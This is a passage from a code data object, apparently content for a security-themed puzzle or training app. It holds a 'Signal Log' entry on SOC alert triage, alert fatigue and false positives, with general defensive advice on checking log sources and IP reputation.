      "Understanding how attacks work is the fastest path to detecting them. Defenders who have performed penetration testing catch attacks faster.",
      "Every attack leaves traces. The key is knowing which log sources to check and which patterns to recognise.",
    ],
  },
  "soc-triage": {
    id: "soc-triage",
    title: "Signal Log -- Entry 8",
    method: "SECURITY OPERATIONS / ALERT TRIAGE",
    analysis: [
      "The Hotel channel simulated a Security Operations Centre alert queue requiring true/false-positive classification.",
      "Alert fatigue — the tendency to dismiss alerts due to volume — is one of the leading causes of missed real threats.",
    ],
    note: [
      "False positives waste analyst time and erode trust in the alerting system. Good tuning is as important as detection rules.",
      "When triaging: check source IP reputation, correlate with known schedules, and look for attack-specific payload patterns before escalating or dismissing.",
    ],
  },
};
